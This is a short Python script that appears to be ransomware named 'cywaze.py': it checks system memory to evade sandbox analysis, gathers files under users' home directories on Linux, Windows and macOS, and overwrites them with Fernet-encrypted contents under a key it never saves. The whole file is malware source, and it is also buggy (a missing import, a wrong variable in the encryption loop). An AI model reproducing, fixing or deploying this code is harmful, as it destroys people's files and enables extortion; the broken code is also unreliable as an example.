import platform
import os
from cryptography.fernet import Fernet
import psutil
meme = psutil.virtual_memory().total 
files = []
#the if is to avoid sandboxing by scanning the sandboxed env to see the size of it if under 750MB then it WILL NOT RUN 
#else it will 
if meme > 750000000:
    time.sleep(5)
    for file in os.listdir():
        if file == "cywaze.py"or file == "readme.txt":
                continue        
        if platform.system() == "Linux":
                targ3 = "/home"
                for root, dirname,file in os.walk(targ3):
                        for x in file:
                                    files.append(x)
        if platform.system() == "Windows":
                targ1 = "C:/users/"
                for root, dirname,file in os.walk(targ1):
                        for x in file:
                                    files.append(x)

        if platform.system == "Darwin":
                targ2 = "/home"
                for root, dirname,file in os.walk(targ2):
                        for x in file:
                                 files.append(x)
else:
    time.sleep(10)
    for file in os.listdir():
        if file == "cywaze.py"or file == "readme.txt":
                continue        
        if platform.system() == "Linux":
                targ3 = "/home"
                for root, dirname,file in os.walk(targ3):
                        for x in file:
                                    files.append(x)
        if platform.system() == "Windows":
                targ1 = "C:/users/"
                for root, dirname,file in os.walk(targ1):
                        for x in file:
                                    files.append(x)

        if platform.system == "Darwin":
                targ2 = "/home"
                for root, dirname,file in os.walk(targ2):
                        for x in file:
                                 files.append(x)
     
seil = Fernet.generate_key()
for x in files:
        with open(file,"rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(seil).encrypt(contents)
        with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)
